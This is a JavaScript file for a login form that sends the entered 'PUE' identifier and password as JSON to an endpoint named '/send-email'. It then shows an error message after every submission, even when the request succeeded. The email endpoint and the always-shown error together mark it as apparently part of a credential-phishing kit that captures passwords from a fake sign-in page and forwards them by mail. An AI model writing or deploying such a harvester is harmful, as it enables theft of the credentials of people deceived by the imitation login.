import { PUE_input, passwordInput, errorMessage, loginButton } from "./util.js";

const loginForm = document.querySelector("#loginForm");
const spinner = document.querySelector("#spinner");
const loginText = document.querySelector("#loginText");

async function sendData(userPUE, password) {
  try {
    const response = await fetch("/send-email", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ userPUE, password }),
    });

    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }

    const data = await response.json();

    console.log("Success:", data);
  } catch (error) {
    console.error("Error:", error);
  } finally {
    setTimeout(() => {
      errorMessage.style.display = "block";
      spinner.style.display = "none";
      loginText.style.display = "block";

      loginButton.disabled = false;
    }, 1000);
  }
}

loginForm.addEventListener("submit", (e) => {
  e.preventDefault();

  loginButton.disabled = true;
  spinner.style.display = "flex";
  loginText.style.display = "none";

  sendData(PUE_input.value, passwordInput.value);
});
